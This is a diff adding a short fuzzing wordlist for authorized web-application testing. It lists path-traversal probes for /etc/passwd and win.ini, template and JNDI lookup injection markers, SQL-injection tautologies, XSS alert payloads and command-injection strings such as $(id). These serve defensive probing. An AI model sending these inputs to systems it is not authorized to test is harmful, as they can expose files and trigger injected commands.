@@ -1,0 +1,48 @@
+# Generic input-fuzzing markers -- for authorized testing of how an
+# in-scope application handles unexpected input (error handling, input
+# validation, encoding). These are detection/probe strings widely used
+# in standard web-testing wordlists (the kind bundled with ffuf/wfuzz/
+# Burp Intruder), not working exploit payloads. Always test against
+# systems you are authorized to test, and confirm findings manually
+# before reporting -- these strings are for triggering observable
+# differences (errors, reflections, timing), not for causing damage.
+
+# -- Special character / boundary probes --
+'
+"
+;
+--
+</
+>
+%00
+%0d%0a
+../
+..\
+../../../../etc/passwd
+..\..\..\..\windows\win.ini
+{{7*7}}
+${7*7}
+${jndi:ldap://example.invalid/a}
+
+# -- SQL-injection detection markers (error-based, not exfiltration payloads) --
+' OR '1'='1
+' OR '1'='1' --
+" OR "1"="1
+1' ORDER BY 1--
+1' UNION SELECT NULL--
+
+# -- XSS reflection markers --
+<script>alert(1)</script>
+"><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+javascript:alert(1)
+
+# -- Command-injection detection markers --
+; id
+| id
+`id`
+$(id)
+
+# -- Oversized / malformed input --
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+%s%s%s%s%s%s%s%s%s%s
